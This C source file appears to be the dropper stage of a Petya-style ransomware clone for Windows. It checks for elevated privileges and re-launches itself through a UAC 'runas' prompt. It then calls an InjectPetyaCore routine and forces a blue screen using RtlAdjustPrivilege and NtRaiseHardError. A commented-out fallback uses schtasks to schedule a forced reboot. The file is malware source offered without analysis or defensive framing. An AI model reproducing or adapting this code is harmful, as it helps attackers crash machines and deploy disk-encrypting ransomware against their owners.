#include <Windows.h>
#include "misc.h"

#include <stdio.h>
#include <time.h>

BOOL 
IsElevated(

)
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if ( OpenProcessToken( GetCurrentProcess( ), TOKEN_QUERY, &hToken ) )
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof( TOKEN_ELEVATION );
		if ( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
			fRet = Elevation.TokenIsElevated;

	}
	if ( hToken )
		CloseHandle( hToken );

	return fRet;
}

VOID
TriggerBSOD(

)
{
	HMODULE ntdll = LoadLibraryA( "ntdll" );
	FARPROC RtlAdjustPrivilege = GetProcAddress( ntdll, "RtlAdjustPrivilege" );
	FARPROC NtRaiseHardError = GetProcAddress( ntdll, "NtRaiseHardError" );

	if ( RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL )
	{
		BOOLEAN tmp1; DWORD tmp2;
		( ( VOID( * )( DWORD, DWORD, BOOLEAN, LPBYTE ) )RtlAdjustPrivilege )( 19, 1, 0, &tmp1 );
		( ( VOID( * )( DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD ) )NtRaiseHardError )( 0xc0000350, 0, 0, 0, 6, &tmp2 );
	}
	

	//if BSOD fails, stay Gucci

	//time_t seconds;
	//struct tm* timeStruct;
	//seconds = time( NULL );
	//timeStruct = localtime( &seconds );

	//CHAR* Gucci = "/c schtasks /Create /SC once /TN \"\" /TR \"shutdown.exe /r /f\" /ST %d:%d";
	//sprintf( Gucci, Gucci, timeStruct->tm_hour, ( timeStruct->tm_min + (rand( ) % 10 + 1) /*set the scheduler for the
	//																						next X (random 1 - 10) minute*/ ) );
	//ShellExecute( 0, "open", "cmd", Gucci, 0, 0, SW_HIDE );

	
}

BOOL
UACElevation(

)
{
	CHAR Path[ 1024 ];
	GetModuleFileName( 0, Path, 1024 );

	if ( !IsElevated( ) )
	{
		SHELLEXECUTEINFO ShellInfo;
		memset( &ShellInfo, 0, sizeof( SHELLEXECUTEINFOA ) );

		ShellInfo.cbSize = sizeof( SHELLEXECUTEINFOA );
		ShellInfo.lpFile = Path;
		ShellInfo.lpVerb = "runas";

		if ( !ShellExecuteEx( &ShellInfo ) )
			return FALSE;
	}
	else
		return TRUE;
		
}


//Entry Point
DWORD
WINAPI
WinMain(

)
{
	//srand( time( 0 ) );
	
	if ( UACElevation( ) )
	{
		InjectPetyaCore( );

		Sleep( 500 );
		TriggerBSOD( );
	}
	else
		ExitProcess( 0 );

	

	return TRUE;
}